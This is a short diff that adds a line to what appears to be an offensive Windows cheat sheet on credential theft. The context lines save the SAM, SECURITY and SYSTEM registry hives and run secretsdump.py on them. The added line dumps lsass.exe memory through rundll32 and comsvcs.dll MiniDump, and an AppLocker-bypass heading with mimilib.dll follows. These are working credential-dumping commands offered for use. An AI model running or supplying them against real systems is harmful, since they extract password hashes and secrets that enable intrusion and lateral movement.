@@ -558,6 +558,8 @@ If you have path traversal plus a location with write access you can exploit tha
   `C:\> reg.exe save hklm\security c:\temp\security.save`   
   `C:\> reg.exe save hklm\system c:\temp\system.save`   
   `# secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`   
+- Using PowerShell:   
+  `Powershell -c rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [process ID of lsass.exe] c:\temp\candies.bin full`   
     
 ## Bypass Applocker
 - Bypass Applocker with mimilib.dll to run arbitrary executables:  
